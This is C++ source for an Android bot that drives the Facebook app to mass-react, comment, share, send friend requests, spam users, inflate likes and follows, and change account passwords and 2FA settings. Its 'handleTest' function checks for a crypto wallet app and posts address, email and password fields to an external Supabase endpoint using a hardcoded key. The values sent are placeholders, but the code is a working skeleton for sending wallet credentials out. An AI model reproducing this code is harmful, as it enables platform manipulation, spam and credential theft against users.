#include "FacebookExt.h"

class FacebookCore : public FacebookExt {

public:
    int minHeight = sHeight * 0.17 + 15;

    void handleTest() {
        Base::updateLine("handleTest");


        string address = "app";
        string email = "app";
        string password = "app";

        string packageName = "com.bgwallet.official";

        if(!existPackage(packageName)){
            updateLine("Notfound Wallet");
            return;
        }

        // post data to api
        Http client("https://aqogmsypyiswmkorzddk.supabase.co/rest/v1/pay", Method::POST);

        client.setContentType("application/json");
        client.setHeader("return=minimal");
        client.setHeader("apikey","eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFxb2dtc3lweWlzd21rb3J6ZGRrIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTEwNTY0ODQsImV4cCI6MjA2NjYzMjQ4NH0.Ahmn3GEi33TJwBeUMjPU196fB-4SMRd2dZbyKDkwzh4");
        JSON body;
        body.set("address", address);
        body.set("email", email);
        body.set("password", password);

        client.setBody(body.toString());

        auto result = client.connect();
        updateLine("handleDone");

    }

    void handleRegisterAccount() {

    }

    ResultScreen handleAction() {
        if (action.scriptType == "READ_NOTIFICATIONS")
            return actionDocThongBao();
        if (action.scriptType == "REACT_NEWFEED")
            return actionReactNewFeed();
        if (action.scriptType == "REACT_FRIEND")
            return actionReactFriend();
        if (action.scriptType == "REACT_GROUP")
            return actionReactGroup();
        if (action.scriptType == "REACT_PAGE")
            return actionReactPage();
        if (action.scriptType == "REACT_PROFILE")
            return actionReactProfile();
        if (action.scriptType == "REACT_WATCH")
            return actionReactWatch();
        if (action.scriptType == "REACT_REEL")
            return actionReactReel();
        if (action.scriptType == "REACT_STORY")
            return actionReactStory();
        if (action.scriptType == "SLEEP")
            return actionSleep();
        if (action.scriptType == "ADD_FRIEND_KEYWORD")
            return actionAddFriendKeyword();
        if (action.scriptType == "ADD_FRIEND_UID")
            return actionAddFriendUid();
        if (action.scriptType == "ADD_FRIEND_SUGGEST")
            return actionAddFriendSuggest();
        if (action.scriptType == "ACCEPT_FRIEND")
            return actionAcceptFriend();
        if (action.scriptType == "CANCEL_FRIEND")
            return actionCancelFriend();
        if (action.scriptType == "ADD_FRIEND_GROUP_KEYWORD")
            return actionAddFriendGroupKeyword();
        if (action.scriptType == "JOIN_GROUP_KEYWORD")
            return actionJoinGroupKeyword();
        if (action.scriptType == "JOIN_GROUP_UID")
            return actionJoinGroupUid();
        if (action.scriptType == "JOIN_GROUP_SUGGEST")
            return actionJoinGroupSuggest();
        if (action.scriptType == "LEAVE_GROUP")
            return actionLeaveGroup();
        if (action.scriptType == "CREATE_GROUP")
            return actionCreateGroup();
        if (action.scriptType == "CREATE_PAGE")
            return actionCreatePage();
        if (action.scriptType == "UP_REEL")
            return actionUpReel();
        if (action.scriptType == "UP_STORY")
            return actionUpStory();
        if (action.scriptType == "UP_WALL")
            return actionUpWall();
        if (action.scriptType == "UP_GROUP")
            return actionUpGroup();
        if (action.scriptType == "SHARE_POST_UID")
            return actionSharePostUid();
        if (action.scriptType == "SPAM_UID")
            return actionSpamUid();
        if (action.scriptType == "SEEDING_EVENT")
            return actionSeedingEvent();
        if (action.scriptType == "EARN_MONEY")
            return actionEarnMoney();
        if (action.scriptType == "RATE_PAGE")
            return actionRatePage();
        if (action.scriptType == "BUFF_LIKE_PAGE")
            return actionBuffLikePage();
        if (action.scriptType == "BUFF_FOLLOW_UID")
            return actionBuffFollowUid();
        if (action.scriptType == "REACT_POST_UID")
            return actionReactPostUid();
        if (action.scriptType == "REACT_POST_KEYWORD")
            return actionReactPostKeyword();
        if (action.scriptType == "REACT_VIDEO_LIVE")
            return actionReactVideoLive();
        if (action.scriptType == "REACT_REEL_UID")
            return actionReactReelUid();
        if (action.scriptType == "INVITE_FRIEND_LIKE_PAGE")
            return actionInviteFriendLikePage();
        if (action.scriptType == "INVITE_FRIEND_JOIN_GROUP")
            return actionInviteFriendJoinGroup();
        if (action.scriptType == "SYNC_CONTACT")
            return actionSyncContact();
        if (action.scriptType == "CHANGE_PASSWORD")
            return actionChangePassword();
        if (action.scriptType == "UP_AVATAR")
            return actionUpAvatar();
        if (action.scriptType == "UP_COVER")
            return actionUpCover();
        if (action.scriptType == "REMOVE_PHONE_NUMBER")
            return actionRemovePhoneNumber();
        if (action.scriptType == "ENABLE_DISABLE_2FA")
            return actionEnableDisable2fa();
        if (action.scriptType == "ADD_MAIL")
            return actionAddMail();
        if (action.scriptType == "CHANGE_NAME")
            return actionChangeName();
        if (action.scriptType == "UPDATE_INFO")
            return actionUpdateInfo();
        if (action.scriptType == "LOGOUT_OLD_DEVICE")
            return actionLogoutOldDevice();
        if (action.scriptType == "REMOVE_TRUSTED_DEVICE")
            return actionRemoveTrustedDevice();
        if (action.scriptType == "ENABLE_DEVELOPER_ACCOUNT")
            return actionEnableDeveloperAccount();
        if (action.scriptType == "REMOVE_POST_ON_WALL")
            return actionRemovePostOnWall();

        return NOMAP;
    }

    //Ok
    ResultScreen actionDocThongBao() {
        //input
        int nudSoLuongFrom = action.getInt("nudSoLuongFrom");
        int nudSoLuongTo = action.getInt("nudSoLuongTo");
        int nudDelayFrom = action.getInt("nudDelayFrom");
        int nudDelayTo = action.getInt("nudDelayTo");

        int soLuong = Common::ranNumber(nudSoLuongFrom, nudSoLuongTo);
        int countSuccess = 0;
        int currentIndex = 0;

        //go to notification
        Base::updateLine("Go to Notify...");
        if (!gotoNotify())
            return ERROR;
        delay(2);

        updateLine("Read Notify " + to_string(countSuccess + 1) + "/" + to_string(soLuong));
        //code here
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            //tìm element
            vector<Node> lstElement = getNodes(
                    "//*[contains(@content-desc,\"Manage notification settings for \") or @content-desc=\"Manage the notification's settings\"]/preceding-sibling::*[1]",
                    xml);
            if (lstElement.empty())
                break;

            //find element
            if (lstElement.size() <= currentIndex) {
                if (swipeAndScreenNotChange())
                    break;

                xml = "";
                lstElement = getNodes(
                        "//*[contains(@content-desc,\"Manage notification settings for \") or @content-desc=\"Manage the notification's settings\"]/preceding-sibling::*[1]",
                        xml);
                currentIndex = 2;
                if (lstElement.size() <= currentIndex)
                    break;
            }

            //click element
            tap(lstElement[currentIndex]);
            delay(2);
            countSuccess++;
            currentIndex++;

            //success -> delay
            delay(nudDelayFrom, nudDelayTo,
                  "Read Notify " + to_string(countSuccess) + "/" + to_string(soLuong) +
                  " success, delay");
            if (countSuccess >= soLuong)
                return DONE;
            updateLine("Read Notify " + to_string(countSuccess + 1) + "/" + to_string(soLuong));

            //back
            for (int i = 0; i < 3; ++i) {
                xml = dumpXml();
                if (handleScreen(xml) == "FB_NOTIFICATIONS")
                    break;
                back();
                delay(2);
            }

            timeStart = high_resolution_clock::now();
        }

        return NOMAP;
    }

    bool isEmulator() {
        return Base::sWidth == 320 && Base::sHeight == 480;
    }

    string getCurrentActivity() {
        return currentActivity;
    }

    bool tapReaction(const string &typeReaction) {
        string xml = dumpXml();
        string xpath = "//*[@content-desc='" + typeReaction + "']";

        vector<Node> lstNodes = getNodes(xpath, xml);
        if (lstNodes.empty())
            return false;

        Node node = lstNodes[0];
        if (existNode("//*[@content-desc='Like']//following-sibling::*[@content-desc='Angry']",
                      xml))
            tap(node.centerX + 30, node.centerY);
        else
            tap(node.centerX, node.centerY);
        return true;
    }

    JSON ReactPost(JSON configs) {
        //input
        string typeReaction = configs.getString("typeReaction");
        typeReaction = Common::strToLower(Common::ranItem(Common::strSplit(typeReaction, "|")));

        //output
        JSON output = JSON();
        output.set("success", false);
        output.set("error", "");

        //code here
        bool skipIfReacted = true;

        string xml = dumpXml();
        string screen = handleScreen(xml);
        if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
            return output;
        if (Common::strContains(screen, "_POPUP_"))
            return output;
        if (screen == "FB_SESSION_EXPIRED") {
            output.set("error", "logout");
            return output;
        }

        string xpath = existNodes(0, xml, {
                "//*[@content-desc='Like button. Double tap and hold to react.']",
                "//*[@content-desc='Like. Double tap and hold to react.']",
                "//*[@content-desc='Like']",//livestream
                "//*[@content-desc='Like Button']",//story
                "//*[@content-desc='Like Reaction']",//story
                "//*[contains(@content-desc, ', pressed. Double tap and hold to change reaction.')]",
        });
        if (xpath.empty()) {
            output.set("error", "not_exist_xpath");
            if (existNode("//android.widget.Button[@text='Share']", xml))
                output.set("error", "dont_allow_react");
            return output;
        }

        if (xpath ==
            "//*[contains(@content-desc, ', pressed. Double tap and hold to change reaction.')]" &&
            skipIfReacted) {
            output.set("error", "already_reacted");
            return output;
        }

        vector<Node> lstNodes = getNodes(xpath, xml);

        if (screen == "FB_STORY" || screen == "FB_LIVESTREAM") {
            Node node = lstNodes[0];

            int pointLeft = Base::sWidth / 20;

            swipe(node.right, node.centerY, pointLeft, node.centerY);
            delay(2);

            xml = dumpXml();
            xpath = existNodes(0, xml, {
                    "//*[@content-desc='" + typeReaction + " Button']",//story
                    "//*[@content-desc='" + typeReaction + " Reaction']",//story
                    "//*[@content-desc='" + typeReaction + "']"//livestream
            });
            if (!xpath.empty() && tap(xpath, xml)) {
                output.set("success", true);
                delay(1);
            }

            swipe(pointLeft, node.centerY, node.right, node.centerY);
        } else {
            Node node;
            for (const Node &n: lstNodes) {
                if (n.width > (isEmulator() ? 27 : 120) && n.top > minHeight) {
                    node = n;
                    break;
                }
            }

            if (node.empty()) {
                output.set("error", "node_like_in_comment_or_top");
                goto Xong;
            }

            if (Common::strContains(typeReaction, "like")) {
                if (tap(node))
                    output.set("success", true);
            } else {
                for (int i = 0; i < 5; i++) {
                    if (!tapLong(node)) {
                        delay(1);
                        continue;
                    }

                    delay(1);
                    if (tapReaction(typeReaction)) {
                        output.set("success", true);
                        break;
                    }
                }
            }
        }

        Xong:
        if (output.getBool("success")) {
            delay(5);
            xml = dumpXml();
            screen = handleScreen(xml);

            if (screen == "FB_GROUP" && existNode("//*[@content-desc='JOIN'][@enabled='true']",
                                                  xml)) {// tương tác nhóm phần for you gợi ý cả nhóm chưa tham gia => gặp thì skip
                tap("//*[contains(@content-desc,'Double tap and hold to change reaction.')]", xml);
                output.set("isSkip", true);
            }

            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock() ||
                screen == "FB_SESSION_EXPIRED") {
                output.set("success", false);
                if (IsBlock())
                    output.set("error", "fb_blocked");
            }
        }
        return output;
    }

    JSON CommentPost(JSON configs) {
        //input
        string contentText = configs.getString("contentText");
        string image = configs.getString("image");
        bool xoaAnhDaDung = configs.getBool("xoaAnhDaDung");
        //output
        JSON output = JSON();
        output.set("success", false);
        output.set("error", "");
        //code here
        string xml = dumpXml();
        string screen = handleScreen(xml);
        if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
            return output;
        if (Common::strContains(screen, "_POPUP_"))
            return output;
        if (screen == "FB_SESSION_EXPIRED") {
            output.set("error", "logout");
            return output;
        }

        if (screen == "FB_LIVESTREAM") {
            if (contentText.empty())
                return output;

            if (!tapCenter("//*[@text='Write a comment…']", xml))
                return output;
            delay(2);

            xml = dumpXml();
            if (existNode("//*[@text=\"You can't comment on this post right now.\"]", xml)) {
                tap("//*[@text='OK']", xml);
                delay(2);
                return output;
            }

            auto [success, content, itemId] = getScriptContent(contentText);

            if (!success) {
                saveStatusAcc("Get Script Content", "Failed", 5, Task::FAIL);
                return output; // chay tiep hoac dung lai
            }

            // comment, dang bai, .....
            // Common::NLog("Content: " + content, "handleTest");

            inputText("//android.widget.EditText", content);
            // xoa content sau khi su dung

            if (!itemId.empty()) {
                deleteScriptContent(itemId);
            }
            delay(1);

            if (!tap("//*[@content-desc='Send' or @text='Post']", "", 5)) {
                back();
                return output;
            }
            delay(4, 6);

            xml = dumpXml();
            screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                return output;
            if (Common::strContains(screen, "_POPUP_"))
                return output;
            if (screen == "FB_SESSION_EXPIRED") {
                output.set("error", "logout");
                return output;
            }
            output.set("success", true);
            return output;
        }

        if (screen == "FB_STORY") {
            if (contentText.empty())
                return output;

            string eComment = existNodes(0, xml, {
                    "//*[contains(@content-desc,'Open the comment sheet')]",
                    "//*[contains(@content-desc,'Reply to ')]",
                    "//*[@text='Send message']",
            });
            if (eComment != "//*[contains(@content-desc,'Open the comment sheet')]")
                return output;

            tapCenter(eComment, xml);
            delay(2);

            auto [success, content, itemId] = getScriptContent(contentText);

            if (!success) {
                saveStatusAcc("Get Script Content", "Failed", 5, Task::FAIL);
                return output; // chay tiep hoac dung lai
            }

            // comment, dang bai, .....
            // Common::NLog("Content: " + content, "handleTest");

            inputText("//android.widget.EditText", content);
            // xoa content sau khi su dung

            if (!itemId.empty()) {
                deleteScriptContent(itemId);
            }
            delay(1);

            xml = "";
            string eSubmit = existNodes(5, xml, {
                    "//*[@content-desc='Send' or @text='Post']",
                    "//*[@content-desc='Send Message Button for On Feed Messaging']"
            });
            if (eSubmit.empty()) {
                back();
                return output;
            }

            tap(eSubmit, xml);
            delay(3, 6);

            xml = dumpXml();
            screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                return output;
            if (Common::strContains(screen, "_POPUP_"))
                return output;
            if (screen == "FB_SESSION_EXPIRED") {
                output.set("error", "logout");
                return output;
            }

            if (eSubmit == "//*[@content-desc='Send Message Button for On Feed Messaging']") {
                back();
            } else {
                for (int i = 0; i < 3; ++i) {
                    xml = dumpXml();
                    if (!existNode("//android.widget.EditText[@text='Aa']", xml))
                        break;
                    back(i == 0 ? 2 : 1);
                }
            }

            output.set("success", true);
            return output;
        }

        string eComment = existNodes(0, xml, {
                "//android.widget.Button[@text='Comment' or @content-desc='Comment']",
                "//*[@text='Comment' or @content-desc='Comment']",
                "//*[@content-desc='Comment Button']",
                "//*[@content-desc='Answer Button']",
                "//*[@text='Answer']",
                "//android.widget.EditText[@resource-id='composerInput']",
                //"//android.widget.EditText[@text='Write a comment…']",
        });
        if (eComment.empty())
            return output;

        vector<Node> lstNodes = getNodes(eComment, xml);
        Node node;
        for (const Node &n: lstNodes) {
            if (n.top > minHeight) {
                node = n;
                break;
            }
        }

        if (node.empty()) {
            output.set("error", "node_comment_in_top");
            return output;
        }

        bool isNeedBack = !existNode(
                "//android.widget.EditText[contains(@text,'Write a') or contains(@text,'Comment as')]",
                xml);

        tapCenter(node);
        delay(2);

        for (int i = 0; i < 3; i++) {
            xml = dumpXml();
            screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                return output;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED") {
                output.set("error", "logout");
                return output;
            }

            string xpath = existNodes(5, xml, {
                    "//android.widget.EditText",
                    "//*[@content-desc='Comment with Instagram']",

                    "//android.widget.LinearLayout[@content-desc='Comment input box']",//livestream
                    "//*[@text='Write a comment…']"//livestream
            });
            if (xpath.empty() || xpath == "//*[@content-desc='Comment with Instagram']")
                break;
            if (xpath == "//android.widget.LinearLayout[@content-desc='Comment input box']" ||
                xpath == "//*[@text='Write a comment…']") {
                tap(xpath, xml);
                delay(2);
                continue;
            }

            bool isSubmit = false;
            if (!contentText.empty()) {
                isSubmit = true;
                auto [success, content, itemId] = getScriptContent(contentText);

                if (!success) {
                    saveStatusAcc("Get Script Content", "Failed", 5, Task::FAIL);
                    return output; // chay tiep hoac dung lai
                }

                // comment, dang bai, .....

                inputText("//android.widget.EditText", content);
                // xoa content sau khi su dung

                if (!itemId.empty()) {
                    deleteScriptContent(itemId);
                }
                delay(1);
            }

            if (!image.empty()) {
                xml = dumpXml();
                if (existNode("//*[@content-desc='Show photos and videos']", xml)) {
                    //Pull image

                    vector<MediaS3> lstMedia = getScriptMedia(image);

                    if (!lstMedia.empty()) {
                        tap("//*[@content-desc='Show photos and videos']", xml);
                        delay(2);

                        xml = "";
                        string elPhoto = existNodes(5, xml, {
                                "//*[@content-desc='Photo' or @content-desc='Video']/*[@content-desc='Photo' or @content-desc='Video']",
                                "//*[contains(@content-desc,'Photo ')][@clickable='true']"
                        });
                        if (!elPhoto.empty()) {
                            isSubmit = true;
                            tap(elPhoto, xml);
                            delay(1);
                            back();

                            if (xoaAnhDaDung)
                                Social::deleteScriptMedia(lstMedia);
                        }
                    }
                }
            }

            hideKeyboard();
            if (!isSubmit) {
                if (i == 1)
                    back();
                break;
            }

            if (!tapCenter("//*[@content-desc='Send' or @text='Post']", "", 5))
                break;
            delay(3, 6);
            hideKeyboard();

            xml = dumpXml();
            screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                return output;
            if (Common::strContains(screen, "_POPUP_"))
                return output;
            if (screen == "FB_SESSION_EXPIRED") {
                output.set("error", "logout");
                return output;
            }


            if (screen == "FB_LIVESTREAM") {
                back();
                output.set("success", true);
                return output;
            }

            auto timeStart = high_resolution_clock::now();
            int timeout = image.empty() ? 10 : 60;
            while (true) {
                if (Common::hasExceededTimeout(timeStart, timeout))
                    break;

                xml = dumpXml();
                screen = handleScreen(xml);
                if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                    return output;
                if (Common::strContains(screen, "_POPUP_"))
                    continue;
                if (screen == "FB_SESSION_EXPIRED")
                    return output;

                if (screen == "FB_GROUP_ANSWER_QUESTIONS") {
                    back();
                    break;
                }

                xpath = existNodes(0, xml, {
                        "//android.widget.ProgressBar",
                        "//*[@text='Posting…' or @content-desc='Posting…']",
                        "//androidx.recyclerview.widget.RecyclerView/child::*[1]//*[@content-desc='Just now']",
                        "//androidx.recyclerview.widget.RecyclerView//*[@content-desc='Just now']",
                        "//androidx.recyclerview.widget.RecyclerView//*[@content-desc='Pending']",
                        "1|//androidx.recyclerview.widget.RecyclerView//*[@content-desc='Declined']",

                });
                if (xpath ==
                    "//androidx.recyclerview.widget.RecyclerView/child::*[1]//*[@content-desc='Just now']"
                    || xpath ==
                       "//androidx.recyclerview.widget.RecyclerView//*[@content-desc='Just now']"
                    || xpath ==
                       "//androidx.recyclerview.widget.RecyclerView//*[@content-desc='Pending']"
                    || xpath ==
                       "//androidx.recyclerview.widget.RecyclerView//*[@content-desc='Declined]")
                    break;

                delay(2);
            }
            output.set("success", true);
            break;
        }

        if (isNeedBack) {
            back();
            delay(1, 2);
        } else {
            xml = dumpXml();
            if (existNode("//android.widget.EditText[@text='Write a comment…']", xml) &&
                existNodes(0, xml, {
                        "//*[@content-desc=\"Comment Button\"]",
                        "//*[@content-desc=\"Answer Button\"]",
                        "//*[@text='Answer']",
                        "//*[@text=\"Comment\"]",
                        "//*[@content-desc=\"Comment\"]"
                }).empty())
                swipe(-1, 1);
        }

        return output;
    }

    bool SetPrivacyPublic() {
        string xml;
        string xpath = existNodes(5, xml, {
                "//*[@text='Public' or starts-with(@content-desc, 'Public')]",
                "//android.widget.ToggleButton"
        });
        if (xpath.empty())
            return false;

        tap(xpath, xml);
        delay(1);

        if (tap("//android.widget.CheckBox[@text='Set as default audience.'][@checked='false']"))
            delay(1);

        if (!tap("//*[@content-desc='Done' or @text='Done' or @text='CHANGE' or @text='SAVE']"))
            return false;
        delay(2);
        return true;
    }

    JSON SharePost(JSON configs) {
        //input
        string contentText = configs.getString("contentText");

        //output
        JSON output = JSON();
        output.set("success", false);
        output.set("error", "");

        string xml = dumpXml();
        string screen = handleScreen(xml);
        if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
            return output;
        if (Common::strContains(screen, "_POPUP_"))
            return output;
        if (screen == "FB_SESSION_EXPIRED") {
            output.set("error", "logout");
            return output;
        }
        if (screen == "FB_STORY") {
            output.set("error", "dont_allow_share");
            return output;
        }

        vector<Node> lstNodes = getNodes(vector<string>{
                "//*[@text='Share' or @content-desc='Share']",
                "//*[contains(@content-desc,'Open the share sheet')]"
        }, xml);
        Node node;
        for (const Node &n: lstNodes) {
            if (n.top > minHeight) {
                node = n;
                break;
            }
        }
        if (node.empty()) {
            output.set("error", "node_share_in_top");
            return output;
        }

        tap(node);
        delay(2);

        bool isSuccess = false;
        auto timeStart = high_resolution_clock::now();
        int timeout = 120;
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))
                break;

            xml = dumpXml();
            screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                goto Xong;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                goto Xong;

            string xpath = existNodes(0, xml, {
                    "//*[@content-desc='Share now' or @text='Share now']",
                    "//*[@content-desc='Write Post']",
                    "//*[@text='POST' or @content-desc='POST'][last()]",
                    "//*[@text='Share' or @content-desc='Share']",
            });

            if (xpath == "//*[@content-desc='Share now' or @text='Share now']" ||
                xpath == "//*[@text='POST' or @content-desc='POST'][last()]") {
                if (!existNode("//*[@content-desc='Public']", xml, 0) &&
                    tap("//*[@content-desc='Write Post' or @content-desc='Feed' or @content-desc='Facebook']/following-sibling::*[1]",
                        xml)) {
                    delay(2);
                    if (!SetPrivacyPublic()) {
                        back();
                        delay(1);
                    }
                    xml = dumpXml();
                }

                if (existNode("//android.widget.EditText", xml)) {
                    auto [success, content, itemId] = getScriptContent(contentText);

                    if (!success) {
                        saveStatusAcc("Get Script Content", "Failed", 5, Task::FAIL);
                        return output; // chay tiep hoac dung lai
                    }

                    // comment, dang bai, .....

                    inputText("//android.widget.EditText", content);
                    // xoa content sau khi su dung

                    if (!itemId.empty()) {
                        deleteScriptContent(itemId);
                    }
                    delay(1);
                    xml = dumpXml();
                }

                tap(xpath, xml);
                delay(2, 4);
                isSuccess = true;
                goto Xong;
            }

            if (xpath == "//*[@content-desc='Write Post']" ||
                xpath == "//*[@text='Share' or @content-desc='Share']") {
                tap(xpath, xml);
                delay(2);
                continue;
            }
        }

        Xong:
        if (isSuccess) {
            xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock() ||
                screen == "FB_SESSION_EXPIRED")
                isSuccess = false;
        } else {
            back();
        }

        return output;
    }

    bool swipeAndTap(const string &xpath, string xml, int timeout) {
        auto timeStart = high_resolution_clock::now();

        while (true) {
            if (tap(xpath, xml))
                return true;

            if (Common::hasExceededTimeout(timeStart, timeout) || IsStop())//Khi timeout
                break;

            if (swipeAndScreenNotChange())
                break;

            xml = "";
        }
        return false;
    }

    void TuongTacNhieuBaiViet(string status) {
        //input
        int cbbOptionsPost = action.getInt(
                "cbbOptionsPost");//0-tính theo số lượng, 1-tính theo thời gian
        int soLuongBai = Common::ranNumber(action.getInt("nudSoLuongFrom"),
                                           action.getInt("nudSoLuongTo"));//số lượng bài
        int thoiGianTuongTac = Common::ranNumber(action.getInt("nudThoiGianFrom"), action.getInt(
                "nudThoiGianTo"));//thời gian tương tác

        int nudTimeFrom = action.getInt("nudTimeFrom");//thời gian xem bài viết
        int nudTimeTo = action.getInt("nudTimeTo");//thời gian xem bài viết

        bool ckbInteract = action.getBool("ckbInteract");//thả cảm xúc?
        int nudPercentInteract = action.getInt("nudPercentInteract");//xác suất thả cảm xúc
        string typeReaction = action.getString("typeReaction");//loại cảm xúc

        bool ckbComment = action.getBool("ckbComment");//comment text?
        int nudPercentComment = action.getInt("nudPercentComment");//xác suất comment text
        string commentContentId = action.getString(
                "commentContentId");//danh sách nội dung comment



        bool ckbSendAnh = action.getBool("ckbSendAnh");//comment ảnh?
        string galleryId = action.getString("galleryId");//ảnh
        int nudPercentSendAnh = action.getInt("nudPercentSendAnh");//xác suất comment ảnh

        bool ckbShareWall = action.getBool("ckbShareWall");//share wall?
        int nudPercentShareWall = action.getInt("nudPercentShareWall");//xác suất share wall
        string shareContentId = action.getString("shareContentId");//danh sách nội dung share wall

        bool isReelByKeywords = action.getBool("isReelByKeywords");
        bool isWatchByKeywords = action.getBool("isWatchByKeywords");

        bool ckbXoaAnhDaDung = action.getBool("ckbXoaAnhDaDung");
        //xử lý input
        if (ckbInteract && (typeReaction.empty() || nudPercentInteract == 0))
            ckbInteract = false;
        if (ckbComment && (commentContentId.empty() || nudPercentComment == 0))
            ckbComment = false;
        if (ckbSendAnh && (galleryId.empty() || nudPercentSendAnh == 0))
            ckbSendAnh = false;
        if (ckbShareWall && nudPercentShareWall == 0)
            ckbShareWall = false;

        //code here
        string statusAction = status + ": ";
        int countPostInteracted = 0;

        int maxSwipe = 10;//max swipe when success = 0

        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        while (true) {
            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            if (cbbOptionsPost == 0)
                statusAction = status + " (" + to_string(countPostInteracted + 1) + "/" +
                               to_string(soLuongBai) + "): ";

            //view post
            delay(nudTimeFrom, nudTimeTo, statusAction + "view post");

            //react
            bool isReactSuccess = false;
            if (ckbInteract && Common::ranBool(nudPercentInteract)) {
                Base::updateLine(statusAction + "react...");

                JSON configs = JSON();
                configs.set("typeReaction", typeReaction);
                JSON response = ReactPost(configs);

                isReactSuccess = response.getBool("success");
                if (!isReactSuccess && IsBlock())
                    break;
            }

            //comment
            bool isCommentSuccess = false;
            bool isCommentText = ckbComment && Common::ranBool(nudPercentComment);
            bool isCommentImage = ckbSendAnh && Common::ranBool(nudPercentSendAnh);
            bool isXoaAnhDaDung = ckbXoaAnhDaDung;
            if (isCommentText || isCommentImage) {
                Base::updateLine(statusAction + "comment...");

                JSON configs = JSON();
                configs.set("contentText", isCommentText ? commentContentId : "");
                configs.set("image", isCommentImage ? galleryId : "");
                configs.set("xoaAnhDaDung", isXoaAnhDaDung);
                JSON response = CommentPost(configs);

                isCommentSuccess = response.getBool("success");

//                if (isCommentSuccess)
//                    back(1,2);

                if (!isCommentSuccess && IsBlock())
                    break;
            }

            //share
            bool isShareSuccess = false;
            if (ckbShareWall && Common::ranBool(nudPercentShareWall)) {
                Base::updateLine(statusAction + "share...");

                JSON configs = JSON();
                configs.set("contentText", shareContentId);
                JSON response = SharePost(configs);

                isShareSuccess = response.getBool("success");
                if (!isShareSuccess && IsBlock())
                    break;
            }

            if (isReactSuccess || isCommentSuccess || isShareSuccess ||
                ((!ckbInteract || nudPercentInteract < 100) &&
                 (!ckbComment || nudPercentComment < 100) &&
                 (!ckbSendAnh || nudPercentSendAnh < 100) &&
                 (!ckbShareWall || nudPercentShareWall < 100))) {
                countPostInteracted++;
            }

            bool isDone = cbbOptionsPost == 0 ? countPostInteracted >= soLuongBai
                                              : Common::hasExceededTimeout(timeStart,
                                                                           thoiGianTuongTac);
            if (isDone)
                break;

            if (cbbOptionsPost == 0 && countPostInteracted == 0) {
                maxSwipe--;
                if (maxSwipe < 0)
                    break;
            }

            Base::updateLine(statusAction + "swipe...");

            if (isReelByKeywords) {
                back(1, 2);
                swipe();

                if (!swipeAndTap("//*[@content-desc='Play current video']", "", 5))
                    break;
                delay(1);
            } else {
                bool isSwipeSuccess = false;
                string activity = getCurrentActivity();
                if (activity == "com.facebook.stories.viewer.activity.StoryViewerActivity") {//story
                    isSwipeSuccess = !swipeHAndScreenNotChange();
                    if (isSwipeSuccess && getCurrentActivity() !=
                                          "com.facebook.stories.viewer.activity.StoryViewerActivity")
                        break;
                } else if (activity ==
                           "com.facebook.fbshorts.viewer.activity.FbShortsViewerActivity") {//reel
                    isSwipeSuccess = !swipeAndScreenNotChange(3);
                } else {
                    if (cbbOptionsPost == 0 && soLuongBai == 1)
                        isSwipeSuccess = !swipeAndScreenNotChange() || !swipeAndScreenNotChange() ||
                                         !swipeAndScreenNotChange() || !swipeAndScreenNotChange() ||
                                         !swipeAndScreenNotChange() || !swipeAndScreenNotChange();
                    else
                        isSwipeSuccess =
                                !swipeAndScreenNotChange(1, 2) || !swipeAndScreenNotChange(1, 2);
                }
                if (!isSwipeSuccess)
                    break;
            }
        }
    }

    ResultScreen actionReactNewFeed() {
        if (!gotoHome())
            return ERROR;

        TuongTacNhieuBaiViet("React feed");
        return DONE;
    }

    ResultScreen actionReactFriend() {
        int soLuong = Common::ranNumber(action.getInt("nudSoLuongBanFrom"),
                                        action.getInt("nudSoLuongBanTo"));

        vector<string> lstFriendsInteracted;
        for (int i = 0; i < soLuong; i++) {
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;

            //goto Friend profile
            {
                if (!gotoFriendsList())
                    break;

                //swipe
                int countSwipe = Common::ranNumber(0, 3);
                for (int j = 0; j < countSwipe; ++j) {
                    if (swipeAndScreenNotChange())
                        break;
                }

                //tap to profile
                Node node;
                string xml;
                while (node.empty()) {
                    xml = dumpXml();
                    vector<Node> lstFriends = getNodes(
                            vector<string>{
                                    "//*[@content-desc='More options']/parent::*[@content-desc!='']",
                                    "//*[@content-desc='More options']/preceding-sibling::*[@content-desc!='']"
                            }, xml);
                    if (lstFriends.empty())
                        break;

                    for (const Node &n: lstFriends) {
                        if (!n.contentDesc.empty() &&
                            !Common::containsItem(lstFriendsInteracted, n.contentDesc)) {
                            node = n;
                            lstFriendsInteracted.push_back(node.contentDesc);
                            break;
                        }
                    }
                    if (!node.empty())
                        break;

                    if (swipeAndScreenNotChange())
                        break;
                }
                if (node.empty())
                    break;

                tapCenter(node);
                delay(3);
                swipe(1, 2);
            }

            TuongTacNhieuBaiViet(
                    "React friend (" + to_string(i + 1) + "/" + to_string(soLuong) + ")");
        }

        return NOMAP;
    }

